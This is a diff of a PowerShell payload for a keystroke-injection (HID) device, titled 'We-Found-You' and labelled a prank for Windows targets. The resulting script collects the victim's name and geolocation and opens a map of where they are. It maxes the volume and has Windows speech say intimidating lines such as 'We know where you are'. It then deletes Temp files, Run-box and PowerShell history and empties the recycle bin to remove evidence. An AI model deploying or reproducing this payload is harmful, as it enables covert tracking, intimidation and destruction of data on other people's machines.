@@ -1,177 +1,102 @@
-############################################################################################################################################################                      
-#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : We-Found-You      | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
-# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
-# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
-# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
-#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
-#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
-#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
-#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
-#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
-#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
-############################################################################################################################################################
-
-<#
-.NOTES
-	The target's Location Services must be turned on or this payload will not work.
-
-.SYNOPSIS
-	This script will get the user's location and open a map of where they are in their browser and use Windows speech to declare you know where they are.  
-
-.DESCRIPTION 
-	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with their Microsoft account.
-	The SSID and WiFi password of any current or previously connected to networks.
-	It determines the last day they changed their password and how many days ago.
-	Once the information is gathered, the script will pause until a mouse movement is detected.
-	Then the script uses Sapi speak to roast their set up and lack of security.
-#>
-
-#-----------------------------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to get the name associated with the targets Microsoft account, if not detected UserName will be used. 
-#>
-
 function Get-fullName {
-
     try {
-
-    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
-
+        $fullName = Net User $Env:username | Select-String -Pattern "Full Name"
+        $fullName = ("$fullName").ToString().Replace("Full Name", "").Trim()
+        Start-Sleep -Milliseconds 500 # Added delay after name retrieval
+        return $fullName
     }
- 
- # If no name is detected function will return $env:UserName 
-
-    # Write Error is just for troubleshooting 
-    catch {Write-Error "No name was detected" 
-    return $env:UserName
-    -ErrorAction SilentlyContinue
+    catch {
+        Write-Error "No name was detected"
+        Start-Sleep -Seconds 1 # Delay on error
+        return $env:UserName
     }
-
-    return $fullName 
-
 }
 
-$FN = Get-fullName
-
-#-----------------------------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to get the current Latitude and Longitude of your target
-#>
-
-function Get-GeoLocation{
-	try {
-	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
-	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
-
-	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
-	}  
-
-	if ($GeoWatcher.Permission -eq 'Denied'){
-		Write-Error 'Access Denied for Location Information'
-	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
-		
-	}
-	}
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No coordinates found" 
-    return "No Coordinates found"
-    -ErrorAction SilentlyContinue
-    } 
-
+function Get-GeoLocation {
+    try {
+        Add-Type -AssemblyName System.Device
+        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
+        $GeoWatcher.Start()
+        Start-Sleep -Seconds 2 # Initial delay for geolocation start
+        $timeout = 0
+        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied') -and ($timeout -lt 20)) {
+            Start-Sleep -Milliseconds 500 # Increased from 100ms
+            $timeout++
+        }
+        if ($GeoWatcher.Permission -eq 'Denied' -or $GeoWatcher.Status -ne 'Ready') {
+            return "Lat:Unknown Lon:Unknown"
+        }
+        $coord = $GeoWatcher.Position.Location
+        return "Lat:$($coord.Latitude) Lon:$($coord.Longitude)"
+    }
+    catch {
+        return "Lat:Unknown Lon:Unknown"
+    }
 }
 
-#-----------------------------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to pause the script until a mouse movement is detected
-#>
-
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+function Pause-Script {
+    Add-Type -AssemblyName System.Windows.Forms
+    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
+    $o = New-Object -ComObject WScript.Shell
+    while ($true) {
+        $pauseTime = 5 # Increased from 3 seconds
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
+            Start-Sleep -Seconds 1 # Final confirmation delay
             break
         }
         else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+            $o.SendKeys("{CAPSLOCK}")
+            Start-Sleep -Seconds $pauseTime
         }
     }
 }
 
-#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+# Main execution flow with added delays
+
+Start-Sleep -Seconds 10 # Initial warm-up delay
 
 $GL = Get-GeoLocation
-
 $GL = $GL -split " "
-
-$Lat = $GL[0].Substring(11) -replace ".$"
-
-$Lon = $GL[1].Substring(10) -replace ".$"
+$Lat = if ($GL[0] -match "Lat:(.+)") { $Matches[1] } else { "Unknown" }
+$Lon = if ($GL[1] -match "Lon:(.+)") { $Matches[1] } else { "Unknown" }
 
 Pause-Script
 
-# Opens their browser with a map of their current location
-
+# Browser launch with extended delay
 Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
+Start-Sleep -Seconds 5 # Extended from 3 seconds
 
-Start-Sleep -s 3
+# Volume adjustment with delays
+$k = [Math]::Ceiling(100/2)
+$o = New-Object -ComObject WScript.Shell
+for ($i = 0; $i -lt $k; $i++) {
+    $o.SendKeys([char]175)
+    Start-Sleep -Milliseconds 50 # Added between volume keypresses
+}
 
-# Sets Volume to max level
-
-$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
-
-# Sets up speech module 
-
-$s=New-Object -ComObject SAPI.SpVoice
+# Speech synthesis with pauses
+$s = New-Object -ComObject SAPI.SpVoice
 $s.Rate = -2
+
+$FN = Get-fullName
+
 $s.Speak("We found you $FN")
+Start-Sleep -Seconds 1 # Pause between phrases
 $s.Speak("We know where you are")
+Start-Sleep -Seconds 1
 $s.Speak("We are everywhere")
+Start-Sleep -Seconds 1
 $s.Speak("We do not forgive, we do not forget")
+Start-Sleep -Seconds 1
 $s.Speak("Expect us")
+Start-Sleep -Seconds 2 # Final pause before cleanup
 
-
-#-----------------------------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
-
-# Delete contents of Temp folder 
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
+# Cleanup with verification delays
+Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
+Start-Sleep -Seconds 1
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
